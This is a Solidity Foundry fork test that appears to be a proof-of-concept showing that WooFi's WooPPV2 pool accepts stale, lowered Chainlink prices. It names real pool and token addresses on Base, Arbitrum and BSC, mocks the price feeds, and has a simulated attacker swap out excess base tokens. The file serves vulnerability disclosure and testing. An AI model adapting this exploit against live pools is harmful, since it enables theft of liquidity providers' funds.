// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IAggregatorV3Like {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IWooPPV2Like {
    function quoteToken() external view returns (address);
    function wooracle() external view returns (address);
    function paused() external view returns (bool);
    function poolSize(address token) external view returns (uint256);
    function query(address fromToken, address toToken, uint256 fromAmount) external view returns (uint256 toAmount);
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external returns (uint256 realToAmount);
}

interface IWooracleV22Like {
    struct State {
        uint128 price;
        uint64 spread;
        uint64 coeff;
        bool woFeasible;
    }

    function clOracles(address token) external view returns (address oracle, uint8 decimal, bool cloPreferred);
    function price(address base) external view returns (uint256 priceNow, bool feasible);
    function cloPrice(address base) external view returns (uint256 priceNow, uint256 timestamp);
    function state(address base) external view returns (State memory);
    function quoteToken() external view returns (address);
    function staleDuration() external view returns (uint256);
    function timestamp() external view returns (uint256);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IWooracleAdminLike {
    function setCloPreferred(address token, bool cloPreferred) external;
}

contract WooFiStaleOracleImpactTest is Test {
    address internal constant DEFAULT_WOO_PP_V2_BASE = 0xEd9e3f98bBed560e66B89AaC922E29D4596A9642;

    address internal constant BASE_WETH = 0x4200000000000000000000000000000000000006;
    address internal constant BASE_USDBC = 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA;
    address internal constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

    address internal constant ARB_WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant ARB_USDCE = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address internal constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant ARB_WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b;

    address internal constant BSC_WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant BSC_USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant BSC_USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant BSC_WOO = 0x4691937a7508860F876c9c0a2a617E7d9E945D4B;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant HEARTBEAT = 1 hours;

    address internal targetPool;
    address internal targetOracle;
    IWooPPV2Like internal pool;
    IWooracleV22Like internal oracle;

    struct Candidate {
        address base;
        address quote;
        address baseFeed;
        address quoteFeed;
        int256 freshBaseAnswer;
        int256 freshQuoteAnswer;
    }

    function setUp() public {
        string memory rpcUrl = vm.envOr("FORK_RPC_URL", vm.envOr("BASE_RPC_URL", vm.envOr("RPC_URL", string(""))));
        require(bytes(rpcUrl).length != 0, "set FORK_RPC_URL, BASE_RPC_URL, or RPC_URL");

        uint256 forkBlock = vm.envOr("FORK_BLOCK", vm.envOr("BASE_FORK_BLOCK", uint256(0)));
        if (forkBlock == 0) {
            vm.createSelectFork(rpcUrl);
        } else {
            vm.createSelectFork(rpcUrl, forkBlock);
        }

        targetPool = vm.envOr("WOO_PP", DEFAULT_WOO_PP_V2_BASE);
        pool = IWooPPV2Like(targetPool);

        address liveOracle = pool.wooracle();
        targetOracle = vm.envOr("WOORACLE", liveOracle);
        require(targetOracle == liveOracle, "configured oracle does not match pool");
        oracle = IWooracleV22Like(targetOracle);
    }

    function testFork_livePreconditions() public view {
        Candidate memory c = _selectCandidate(true);

        assertEq(pool.wooracle(), targetOracle, "pool uses a different oracle");
        assertEq(oracle.quoteToken(), c.quote, "oracle quote mismatch");
        assertFalse(pool.paused(), "pool is paused");
        assertGt(pool.poolSize(c.quote), 0, "quote reserve is zero");
        assertGt(pool.poolSize(c.base), 0, "base reserve is zero");

        (, , bool cloPreferred) = oracle.clOracles(c.base);
        assertTrue(cloPreferred, "candidate token does not prefer CLO fallback");
    }

    function testFork_staleChainlinkPriceAcceptedAndTransfersExcessBase() public {
        Candidate memory c = _selectCandidate(true);
        _proveImpact(c);
    }

    function testLocal_forcedCloPreferredStalePriceTransfersExcessBase() public {
        Candidate memory c = _selectCandidate(false);

        (, , bool cloPreferredBefore) = oracle.clOracles(c.base);
        if (!cloPreferredBefore) {
            address owner = IOwnableLike(targetOracle).owner();
            vm.prank(owner);
            IWooracleAdminLike(targetOracle).setCloPreferred(c.base, true);
        }

        (, , bool cloPreferredAfter) = oracle.clOracles(c.base);
        assertTrue(cloPreferredAfter, "local forced cloPreferred did not stick");

        _proveImpact(c);
    }

    function _proveImpact(Candidate memory c) internal {
        uint256 targetTime = block.timestamp;
        uint256 wooTs = oracle.timestamp();
        uint256 staleDuration = oracle.staleDuration();
        if (targetTime <= wooTs + staleDuration) {
            targetTime = wooTs + staleDuration + 1;
        }
        vm.warp(targetTime);

        uint256 quoteAmount = 10 * (10 ** IERC20Like(c.quote).decimals());

        _mockFeeds(c, c.freshBaseAnswer, targetTime, c.freshQuoteAnswer, targetTime);
        (bool freshOk, uint256 freshOut) = _tryQuery(c.quote, c.base, quoteAmount);
        require(freshOk && freshOut > 0, "fresh-price baseline query failed");

        (uint256 acceptedBps, int256 staleBaseAnswer, uint256 staleOut) = _findAcceptedStalePrice(c, quoteAmount, freshOut);
        uint256 staleUpdatedAt = targetTime - (2 * HEARTBEAT);

        _mockFeeds(c, staleBaseAnswer, staleUpdatedAt, c.freshQuoteAnswer, targetTime);
        (uint256 oraclePrice, bool feasible) = oracle.price(c.base);
        (, uint256 cloUpdatedAt) = oracle.cloPrice(c.base);

        assertTrue(feasible, "oracle rejected stale CLO price");
        assertGt(block.timestamp - cloUpdatedAt, HEARTBEAT, "CLO timestamp is not stale");
        assertGt(staleOut, freshOut, "stale quote does not improve attacker output");
        assertGt(oraclePrice, 0, "oracle returned zero price");

        address attacker = makeAddr("attacker");
        deal(c.quote, attacker, quoteAmount, true);

        uint256 beforeBase = IERC20Like(c.base).balanceOf(attacker);
        vm.startPrank(attacker);
        require(IERC20Like(c.quote).transfer(address(pool), quoteAmount), "quote pre-transfer failed");
        uint256 realOut = pool.swap(c.quote, c.base, quoteAmount, 0, attacker, address(0));
        vm.stopPrank();
        uint256 gainedBase = IERC20Like(c.base).balanceOf(attacker) - beforeBase;

        assertEq(gainedBase, realOut, "balance delta does not match swap output");
        assertGt(gainedBase, freshOut, "swap did not transfer excess base token");

        emit log_named_address("base token", c.base);
        emit log_named_address("quote token", c.quote);
        emit log_named_address("base Chainlink feed", c.baseFeed);
        emit log_named_uint("fresh baseline out", freshOut);
        emit log_named_uint("stale swap out", gainedBase);
        emit log_named_uint("accepted stale price bps", acceptedBps);
        emit log_named_uint("stale seconds", block.timestamp - cloUpdatedAt);
    }

    function _selectCandidate(bool requireCloPreferred) internal view returns (Candidate memory c) {
        require(pool.wooracle() == targetOracle, "pool oracle mismatch");
        require(!pool.paused(), "pool is paused");

        address quote = pool.quoteToken();
        require(pool.poolSize(quote) > 0, "quote reserve is zero");

        address[16] memory bases = _candidateBases();
        for (uint256 i = 0; i < bases.length; i++) {
            address base = bases[i];
            if (base == address(0) || base == quote || pool.poolSize(base) == 0) {
                continue;
            }

            (address baseFeed, , bool cloPreferred) = oracle.clOracles(base);
            (address quoteFeed, , ) = oracle.clOracles(quote);
            if ((requireCloPreferred && !cloPreferred) || baseFeed == address(0) || quoteFeed == address(0)) {
                continue;
            }

            (, int256 baseAnswer, , , ) = IAggregatorV3Like(baseFeed).latestRoundData();
            (, int256 quoteAnswer, , , ) = IAggregatorV3Like(quoteFeed).latestRoundData();
            if (baseAnswer <= 0 || quoteAnswer <= 0) {
                continue;
            }

            return Candidate({
                base: base,
                quote: quote,
                baseFeed: baseFeed,
                quoteFeed: quoteFeed,
                freshBaseAnswer: baseAnswer,
                freshQuoteAnswer: quoteAnswer
            });
        }

        if (requireCloPreferred) {
            revert("no live cloPreferred candidate with reserve");
        }
        revert("no local candidate with reserve and Chainlink feeds");
    }

    function _candidateBases() internal view returns (address[16] memory bases) {
        uint256 n;

        address env0 = vm.envOr("WOO_BASE_TOKEN_0", address(0));
        address env1 = vm.envOr("WOO_BASE_TOKEN_1", address(0));
        address env2 = vm.envOr("WOO_BASE_TOKEN_2", address(0));
        address env3 = vm.envOr("WOO_BASE_TOKEN_3", address(0));
        if (env0 != address(0)) bases[n++] = env0;
        if (env1 != address(0)) bases[n++] = env1;
        if (env2 != address(0)) bases[n++] = env2;
        if (env3 != address(0)) bases[n++] = env3;

        if (block.chainid == 8453) {
            bases[n++] = BASE_WETH;
            bases[n++] = BASE_USDBC;
            bases[n++] = BASE_USDC;
        } else if (block.chainid == 42161) {
            bases[n++] = ARB_WETH;
            bases[n++] = ARB_USDCE;
            bases[n++] = ARB_USDC;
            bases[n++] = ARB_WOO;
        } else if (block.chainid == 56) {
            bases[n++] = BSC_WBNB;
            bases[n++] = BSC_USDT;
            bases[n++] = BSC_USDC;
            bases[n++] = BSC_WOO;
        }
    }

    function _findAcceptedStalePrice(Candidate memory c, uint256 quoteAmount, uint256 freshOut)
        internal
        returns (uint256 acceptedBps, int256 staleBaseAnswer, uint256 staleOut)
    {
        uint256 startBps = vm.envOr("STALE_PRICE_BPS", uint256(8_000));
        if (startBps >= BPS) {
            startBps = 9_900;
        }

        uint256 targetTime = block.timestamp;
        uint256 staleUpdatedAt = targetTime - (2 * HEARTBEAT);

        for (uint256 bps = startBps; bps < BPS; bps += 100) {
            uint256 rawCandidateAnswer = (uint256(c.freshBaseAnswer) * bps) / BPS;
            require(rawCandidateAnswer <= uint256(type(int256).max), "candidate answer overflows int256");
            // forge-lint: disable-next-line(unsafe-typecast)
            int256 candidateAnswer = int256(rawCandidateAnswer);
            if (candidateAnswer <= 0) {
                continue;
            }

            _mockFeeds(c, candidateAnswer, staleUpdatedAt, c.freshQuoteAnswer, targetTime);
            (bool ok, uint256 out) = _tryQuery(c.quote, c.base, quoteAmount);
            if (ok && out > freshOut) {
                return (bps, candidateAnswer, out);
            }
        }

        revert("no accepted stale price deviation found");
    }

    function _tryQuery(address fromToken, address toToken, uint256 fromAmount)
        internal
        view
        returns (bool ok, uint256 out)
    {
        try pool.query(fromToken, toToken, fromAmount) returns (uint256 toAmount) {
            return (true, toAmount);
        } catch {
            return (false, 0);
        }
    }

    function _mockFeeds(
        Candidate memory c,
        int256 baseAnswer,
        uint256 baseUpdatedAt,
        int256 quoteAnswer,
        uint256 quoteUpdatedAt
    ) internal {
        vm.mockCall(
            c.baseFeed,
            abi.encodeWithSelector(IAggregatorV3Like.latestRoundData.selector),
            abi.encode(uint80(1), baseAnswer, baseUpdatedAt, baseUpdatedAt, uint80(1))
        );
        vm.mockCall(
            c.quoteFeed,
            abi.encodeWithSelector(IAggregatorV3Like.latestRoundData.selector),
            abi.encode(uint80(1), quoteAnswer, quoteUpdatedAt, quoteUpdatedAt, uint80(1))
        );
    }
}
